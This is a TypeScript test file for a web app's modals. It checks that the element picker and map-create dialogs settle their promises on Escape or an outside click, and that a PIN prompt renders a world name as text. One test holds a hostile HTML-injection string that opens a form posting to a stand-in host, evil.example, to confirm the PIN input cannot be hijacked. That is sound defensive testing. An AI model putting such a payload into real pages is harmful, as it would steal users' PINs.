/**
 * S361 (gate F4 + F5). A modal that hands back a promise must settle it
 * however the user closes it. After S360 made Escape topmost-only, the element
 * picker's own Escape listener ran AFTER BaseModal's, found itself no longer
 * topmost, and never resolved; its overlay `click` had the same hole behind
 * the base's pointerup close. The map-create modal copied both. The fix is the
 * pin-prompt idiom: resolve null inside `hide()`, the one path every close
 * takes.
 *
 * F5 rides here because it is the same file family: the PIN prompt's context
 * line carries an account world name and must render as text.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { pickElement } from '../../src/ui/element-picker-modal';
import { createMapDialog } from '../../src/ui/map-create-modal';
import { PinPromptModal } from '../../src/ui/pin-prompt-modal';
import { patchSlice } from '../../src/core/state';
import { setActiveStore } from '../../src/core/active-store';
import { MockFolderStore } from '../fixtures/mock-folder-store';
import { ToastManager } from '../../src/ui/toast-manager';

const PENDING = Symbol('pending');
async function settled<T>(p: Promise<T>): Promise<T | typeof PENDING> {
  return Promise.race([p, new Promise<typeof PENDING>(r => setTimeout(() => r(PENDING), 20))]);
}

function pressEscape(): void {
  document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
}

/** A full outside click: press AND release on the overlay (S318 discipline). */
function clickOverlay(): void {
  const overlay = document.querySelector('.atlas-modal-overlay')!;
  overlay.dispatchEvent(new Event('pointerdown', { bubbles: true }));
  overlay.dispatchEvent(new Event('pointerup', { bubbles: true }));
  overlay.dispatchEvent(new Event('click', { bubbles: true }));
}

beforeEach(async () => {
  // The pending check races a real timer; a fake clock left by another file
  // in the shared worker would hang it.
  vi.useRealTimers();
  document.body.innerHTML = '';
  const store = new MockFolderStore();
  await store.open(null);
  setActiveStore(store as never);
  patchSlice('active', { worldId: 'w1', meta: { id: 'w1', name: 'World' }, opened: true });
  patchSlice('data', { elements: [] });
});

describe('a modal promise settles however the modal closes', () => {
  it('pickElement resolves null on Escape', async () => {
    const p = pickElement();
    expect(document.querySelector('.atlas-modal-overlay')).not.toBeNull();
    pressEscape();
    expect(await settled(p)).toBeNull();
    expect(document.querySelector('.atlas-modal-overlay')).toBeNull();
  });

  it('pickElement resolves null on a full outside click', async () => {
    const p = pickElement();
    clickOverlay();
    expect(await settled(p)).toBeNull();
  });

  it('createMapDialog resolves null on Escape', async () => {
    const p = createMapDialog(new ToastManager());
    expect(document.querySelector('[data-modal="create-map"]')).not.toBeNull();
    pressEscape();
    expect(await settled(p)).toBeNull();
  });

  it('Escape on a picker over map-create closes only the picker (S360 stays true)', async () => {
    const outer = createMapDialog(new ToastManager());
    const inner = pickElement();
    pressEscape();
    expect(await settled(inner)).toBeNull();
    expect(await settled(outer)).toBe(PENDING);
    expect(document.querySelector('[data-modal="create-map"]')).not.toBeNull();
    pressEscape();
    expect(await settled(outer)).toBeNull();
  });
});

describe('the PIN prompt renders its context as text (gate F5)', () => {
  it('a world name carrying a form cannot re-parent the PIN input', async () => {
    const hostile = 'X</p></form><form action="https://evil.example/collect"><p>';
    const p = new PinPromptModal().prompt(`Opening "${hostile}": atlas needs your PIN.`);
    const input = document.querySelector<HTMLInputElement>('input[name="pin"]')!;
    expect(input.form?.getAttribute('data-form')).toBe('pin-prompt');
    expect(document.querySelectorAll('form').length).toBe(1);
    expect(document.querySelector('[data-role="context"]')!.textContent).toContain(hostile);
    pressEscape();
    expect(await settled(p)).toBeNull();
  });
});
